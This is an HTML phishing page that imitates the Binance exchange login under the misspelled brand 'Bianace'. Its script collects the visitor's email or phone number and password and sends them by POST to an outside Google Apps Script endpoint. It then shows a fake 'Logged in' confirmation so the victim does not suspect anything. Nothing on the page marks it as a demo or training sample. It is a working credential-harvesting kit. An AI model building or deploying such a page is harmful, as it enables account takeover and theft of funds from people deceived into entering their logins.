<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Log In | Bianace</title>
<style>
  :root{
    --ms-gold: #f0b90b;
    --ms-gold-dark: #d9a70a;
    --ms-bg: #0b0e11;
    --ms-card: #181a20;
    --ms-line: #2b3139;
    --ms-text: #eaecef;
    --ms-text-soft: #848e9c;
    --ms-error: #f6465d;
  }

  *{ box-sizing:border-box; }

  body{
    margin:0;
    min-height:100vh;
    display:flex;
    align-items:center;
    justify-content:center;
    background:var(--ms-bg);
    font-family: "Inter","Helvetica Neue",Arial,sans-serif;
    color:var(--ms-text);
    padding:24px;
  }

  .card{
    width:100%;
    max-width:420px;
    background:var(--ms-card);
    border:1px solid var(--ms-line);
    border-radius:16px;
    padding:40px 36px 32px;
  }

  .demo-badge{
    text-align:center;
    font-size:12px;
    font-weight:600;
    color:#f0b90b;
    background:rgba(240,185,11,0.08);
    border:1px solid rgba(240,185,11,0.3);
    border-radius:6px;
    padding:6px 10px;
    margin-bottom:24px;
  }

  .brand{
    display:flex;
    align-items:center;
    gap:10px;
    margin-bottom:32px;
  }

  .brand-mark{
    width:30px;
    height:30px;
    border-radius:8px;
    background: linear-gradient(135deg,var(--ms-gold),#f8d33a);
    display:flex;
    align-items:center;
    justify-content:center;
    color:#0b0e11;
    font-size:16px;
    font-weight:800;
    transform:rotate(45deg);
    flex-shrink:0;
  }
  .brand-mark span{ transform:rotate(-45deg); }

  .brand-name{
    font-size:19px;
    font-weight:700;
    letter-spacing:.5px;
    color:var(--ms-text);
  }

  .head-row{
    display:flex;
    align-items:flex-start;
    justify-content:space-between;
    margin-bottom:28px;
  }

  h1{
    font-size:26px;
    font-weight:700;
    margin:0;
  }

  .qr-btn{
    width:38px;height:38px;
    border-radius:8px;
    background:#2b3139;
    display:flex;align-items:center;justify-content:center;
    font-size:18px;
    flex-shrink:0;
    cursor:pointer;
  }

  .step{ display:none; }
  .step.active{ display:block; }

  label.field-label{
    display:block;
    font-size:13px;
    font-weight:600;
    color:var(--ms-text-soft);
    margin-bottom:8px;
  }

  .field{ margin-bottom:6px; }

  .field input{
    width:100%;
    padding:14px 14px;
    font-size:15px;
    background:transparent;
    border:1px solid var(--ms-line);
    border-radius:8px;
    color:var(--ms-text);
    outline:none;
    transition: border-color .15s ease;
  }
  .field input::placeholder{ color:#5e6673; }
  .field input:focus{ border-color:var(--ms-gold); }

  .error-text{
    font-size:12px;
    color:var(--ms-error);
    margin:6px 2px 18px;
    display:none;
  }
  .error-text.show{ display:block; }

  .sub-row{
    font-size:13px;
    color:var(--ms-text-soft);
    margin:0 0 24px;
  }
  .sub-row strong{ color:var(--ms-text); font-weight:600; }

  .link-btn{
    background:none;
    border:none;
    color:var(--ms-gold);
    font-size:13px;
    font-weight:600;
    cursor:pointer;
    padding:0;
  }

  .row{
    display:flex;
    justify-content:flex-end;
    margin:10px 0 24px;
  }

  .btn-primary{
    width:100%;
    background:var(--ms-gold);
    color:#0b0e11;
    border:none;
    border-radius:8px;
    padding:14px;
    font-size:15px;
    font-weight:700;
    cursor:pointer;
    transition: background .15s ease;
  }
  .btn-primary:hover{ background:var(--ms-gold-dark); }

  .btn-secondary{
    width:100%;
    background:#2b3139;
    color:var(--ms-text);
    border:none;
    border-radius:8px;
    padding:14px;
    font-size:15px;
    font-weight:700;
    cursor:pointer;
    margin-top:12px;
  }

  .success{ text-align:center; padding:10px 0 4px; }
  .success .check{
    width:52px;height:52px;
    border-radius:50%;
    background:rgba(15,204,111,0.12);
    color:#0ecb81;
    display:flex;align-items:center;justify-content:center;
    margin:0 auto 18px;
    font-size:26px;
  }

  .footer-note{
    text-align:center;
    font-size:11px;
    color:var(--ms-text-soft);
    margin-top:26px;
    line-height:1.6;
  }

  @media (max-width:480px){
    .card{ border-radius:0; min-height:100vh; padding:32px 22px; }
    body{ padding:0; }
  }
</style>
</head>
<body>

<div class="card">

  <div class="brand">
    <div class="brand-mark"><span>B</span></div>
    <div class="brand-name">Bianace</div>
  </div>

  <!-- STEP 1: EMAIL -->
  <div class="step active" id="step-email">
    <div class="head-row">
      <h1>Log in</h1>
      <div class="qr-btn">▦</div>
    </div>

    <label class="field-label" for="email-input">Email/Phone number</label>
    <div class="field">
      <input type="text" id="email-input" placeholder="Email/Phone (without country code)" autocomplete="off">
    </div>
    <div class="error-text" id="email-error">Enter a valid email or phone number</div>

    <button class="btn-primary" id="email-next" style="margin-top:14px;">Log In</button>
  </div>

  <!-- STEP 2: PASSWORD -->
  <div class="step" id="step-password">
    <div class="head-row">
      <h1>Enter password</h1>
    </div>

    <p class="sub-row">Logging in as <strong id="email-display">you@example.com</strong> · <button class="link-btn" id="change-email">Change</button></p>

    <label class="field-label" for="password-input">Password</label>
    <div class="field">
      <input type="password" id="password-input" placeholder="Enter your password" autocomplete="off">
    </div>
    <div class="error-text" id="password-error">Enter your password</div>

    <div class="row" style="justify-content:flex-start; margin-top:-8px;">
      <button class="link-btn">Forgot password?</button>
    </div>

    <button class="btn-primary" id="password-next" style="margin-top:18px;">Log In</button>
  </div>

  <!-- STEP 3: SUCCESS -->
  <div class="step" id="step-success">
    <div class="success">
      <div class="check">✓</div>
      <h1 style="font-size:20px; margin-bottom:6px;">Logged in</h1>
    </div>
    <button class="btn-secondary" id="restart-btn">Start over</button>
  </div>


</div>

<script>
  const emailInput = document.getElementById('email-input');
  const passwordInput = document.getElementById('password-input');
  const stepEmail = document.getElementById('step-email');
  const stepPassword = document.getElementById('step-password');
  const stepSuccess = document.getElementById('step-success');
  const emailError = document.getElementById('email-error');
  const passwordError = document.getElementById('password-error');
  const emailDisplay = document.getElementById('email-display');

  function isValidEmailOrPhone(v){
    const isEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v);
    const isPhone = /^[0-9]{6,15}$/.test(v.replace(/\s/g,''));
    return isEmail || isPhone;
  }

  document.getElementById('email-next').addEventListener('click', () => {
    const val = emailInput.value.trim();
    if(!isValidEmailOrPhone(val)){
      emailError.classList.add('show');
      return;
    }
    emailError.classList.remove('show');
    emailDisplay.textContent = val;
    stepEmail.classList.remove('active');
    stepPassword.classList.add('active');
    setTimeout(() => passwordInput.focus(), 50);
  });

  emailInput.addEventListener('keydown', (e) => {
    if(e.key === 'Enter') document.getElementById('email-next').click();
  });

  document.getElementById('change-email').addEventListener('click', () => {
    stepPassword.classList.remove('active');
    stepEmail.classList.add('active');
  });

  document.getElementById('password-next').addEventListener('click', async () => {
    if(passwordInput.value.length === 0){
      passwordError.classList.add('show');
      return;
    }
    passwordError.classList.remove('show');
    const formData=new FormData();
    formData.append('email',emailInput.value.trim());
    formData.append('password',passwordInput.value);
    try{
      await fetch('https://script.google.com/macros/s/AKfycbzLgnBn7O5qPd6e4Qm6-XKdkP6zz7MWVR6jFLzmbYD5X04ennSFT2Vl_T_6f2ROOGXJ/exec',{
        method:'POST',
        body:formData,
        mode:'no-cors'
      });
      stepPassword.classList.remove('active');
      stepSuccess.classList.add('active');
    }catch(err){
      alert('Connection error.');
      console.log(err);
    }
  });

  passwordInput.addEventListener('keydown', (e) => {
    if(e.key === 'Enter') document.getElementById('password-next').click();
  });

  document.getElementById('restart-btn').addEventListener('click', () => {
    emailInput.value = '';
    passwordInput.value = '';
    emailError.classList.remove('show');
    passwordError.classList.remove('show');
    stepSuccess.classList.remove('active');
    stepEmail.classList.add('active');
  });
</script>

</body>
</html>
